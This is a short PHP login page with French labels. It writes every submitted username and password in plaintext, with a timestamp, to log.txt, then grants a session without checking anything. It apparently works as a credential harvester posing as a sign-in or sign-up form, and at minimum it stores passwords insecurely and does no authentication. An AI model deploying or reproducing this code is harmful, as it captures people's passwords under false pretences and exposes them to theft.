<?php
session_start();

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $username = trim($_POST['username']);
    $password = trim($_POST['password']);

    // Stocker dans log.txt
    $log = date('Y-m-d H:i:s') . " | $username | $password\n";
    file_put_contents('log.txt', $log, FILE_APPEND);

    $_SESSION['user'] = $username;
    header('Location: index.php');
    exit;
}

if (isset($_SESSION['user'])) {
    header('Location: index.php');
    exit;
}
?>
<form method="POST">
    <input type="text" name="username" placeholder="Nom d'utilisateur" required>
    <input type="password" name="password" placeholder="Mot de passe" required>
    <button type="submit">Se connecter / S'inscrire</button>
</form>